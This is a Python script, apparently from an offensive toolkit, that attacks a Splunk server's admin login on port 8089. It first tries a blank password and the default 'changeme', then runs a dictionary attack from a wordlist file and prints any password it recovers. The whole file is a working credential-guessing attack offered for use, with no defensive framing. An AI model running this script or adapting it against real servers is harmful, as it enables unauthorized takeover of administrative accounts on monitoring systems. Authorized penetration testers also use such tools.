#!/usr/bin/env python3

# Splunk Login Bruteforce

#%%%%%%%%%%% Libraries %%%%%%%%%%%#

import sys
import colorama
from colorama import Fore, Style
import os

sys.path.append('../')
import splunklib.client as client

#%%%%%%%%%%% Constants %%%%%%%%%%%#

separator = "[*] ============================================================================================================== [*]"

#%%%%%%%%%%% Functions %%%%%%%%%%%#

def bruteforcesplunk(splunkServer):

    splunkAdmin = "admin"
    __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
    file = open(os.path.join(__location__, 'dict.txt'))
    bruteforce_successful=0
    free=0
    defaultpass=0

# First Try Default Password "changeme" and Splunk Free Version

    if(defaultpass==0):
        try:
            splunkService = client.connect(host=splunkServer, port=8089, username=splunkAdmin, password="")
            free = 1
            print(separator)
            print("[!] Splunk Free Version - No need to attack")
            print(separator)
            print("[*] Username: "+Fore.RED+Style.BRIGHT+"admin")
            print("[*] Password: "+Fore.RED+Style.BRIGHT+"no password")
            print(separator)
        except Exception as e:
            pass

    if(free==0):
        try:
            splunkService = client.connect(host=splunkServer, port=8089, username=splunkAdmin, password="changeme")
            defaultpass=1
            print(separator)
            print("[!] Splunk with Default Password - No need to attack")
            print(separator)
            print("[*] Username: "+Fore.RED+Style.BRIGHT+"admin")
            print("[*] Password: "+Fore.RED+Style.BRIGHT+"changeme")
            print(separator)
        except Exception as e:
            pass

    if(free==0 and defaultpass==0):
        for line in file:
            splunkPassword = line.strip('\n\r')

            try:
                splunkService = client.connect(host=splunkServer, port=8089, username=splunkAdmin, password=splunkPassword)
                bruteforce_successful=1
                break
            except Exception as e:
                pass

        if (bruteforce_successful):
            print(separator)
            print("[!] Dictionary Attack Successful!")
            print(separator)
            print("[!] Username: "+Fore.RED+Style.BRIGHT+"admin")
            print("[!] Password: "+Fore.RED+Style.BRIGHT+splunkPassword)
            print(separator)
        else:
            print(separator)
            print("[!] Dictionary Attack Not Successful")
            print(separator)

# %%%%%%%%%% The End %%%%%%%%%%#


